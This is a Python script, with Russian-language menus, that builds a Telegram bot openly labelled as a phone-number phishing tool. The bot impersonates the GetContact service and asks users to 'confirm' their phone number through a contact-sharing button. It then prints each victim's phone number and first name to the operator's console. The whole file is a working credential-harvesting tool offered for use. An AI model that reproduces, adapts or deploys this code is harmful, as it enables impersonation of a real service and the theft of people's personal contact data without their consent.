


###################################################################################################################################################################################
def main_lin():
	print(Fore.RED)
	print("Добро пожаловать!")
	print()
	print()
	print("Выберите действие")
	print(Fore.YELLOW)
	print()
	print("[+]Фишинг номера, телеграм бот [01]")
	print()
	print()
	vib = input("$ ")

	if vib == '1' or vib == '01':
		bot_fishing_numbet_telegram_lin()



###################################################################################################################################################################################
def main_win():
	print(Fore.RED)
	print("Добро пожаловать!")
	print()
	print()
	print("Выберите действие")
	print()
	print(Fore.YELLOW)
	print("[+]Фишинг номера, телеграм бот [01]")
	print()
	print()
	vib = input("$ ")

	if vib == '1' or vib == '01':
		bot_fishing_numbet_telegram_win()



###################################################################################################################################################################################
def bot_fishing_numbet_telegram_win():
	print("Загрузка библиотек...")

	os.system("pip install PyTelegramBotApi")
	os.system("cls")

	import telebot
	from telebot import types

	TOKEN = input("Введите токен бота: ")
	bot = telebot.TeleBot(TOKEN)

	@bot.message_handler(commands=['start'])
	def mess(message):
		bot.send_message(message.chat.id, 'Добро пожаловать в GetContact!')
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Отправить телефон", request_contact=True) 
		keyboard.add(button_phone) 
		bot.send_message(message.chat.id, 'Для использования сервиса подтвердите свой номер телефона.', reply_markup=keyboard)
		
	@bot.message_handler(content_types=['contact']) 
	def contact(message):
		if message.contact is not None: 
			print( 'Номер - ' + message.contact.phone_number)
			print( 'Имя - ' + message.contact.first_name)


	bot.polling()
###################################################################################################################################################################################


def bot_fishing_numbet_telegram_lin():
	print("Загрузка библиотек...")

	os.system("pip install PyTelegramBotApi")
	os.system("clear")

	import telebot
	from telebot import types

	TOKEN = input("Введите токен бота: ")
	bot = telebot.TeleBot(TOKEN)

	@bot.message_handler(commands=['start'])
	def mess(message):
		bot.send_message(message.chat.id, 'Добро пожаловать в GetContact!')
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Отправить телефон", request_contact=True) 
		keyboard.add(button_phone) 
		bot.send_message(message.chat.id, 'Для использования сервиса подтвердите свой номер телефона.', reply_markup=keyboard)
		
	@bot.message_handler(content_types=['contact']) 
	def contact(message):
		if message.contact is not None: 
			print( 'Номер - ' + message.contact.phone_number)
			print( 'Имя - ' + message.contact.first_name)
			print()


	bot.polling()


###################################################################################################################################################################################









import os
from sys import platform as oc
import sqlite3 as sql
import time
from random import randint
from colorama import init, Fore, Back
init()




if oc == 'win32':
	os.system("cls")
	print(Fore.GREEN)


	print("""


░█▀▄▀█ ░█▀▀▀█ ░█▄─░█ ░█▀▀▀█ ░█─── ▀█▀ ▀▀█▀▀ 
░█░█░█ ░█──░█ ░█░█░█ ░█──░█ ░█─── ░█─ ─░█── 
░█──░█ ░█▄▄▄█ ░█──▀█ ░█▄▄▄█ ░█▄▄█ ▄█▄ ─░█──
		""")
	main_win()









elif oc == 'linux' or oc == 'linux2':
	os.system("clear")
	print("""


███████╗██╗░░░██╗███╗░░██╗███████╗
██╔════╝██║░░░██║████╗░██║██╔════╝
█████╗░░██║░░░██║██╔██╗██║█████╗░░
██╔══╝░░██║░░░██║██║╚████║██╔══╝░░
██║░░░░░╚██████╔╝██║░╚███║██║░░░░░
╚═╝░░░░░░╚═════╝░╚═╝░░╚══╝╚═╝░░░░░
		""")
main_lin()


















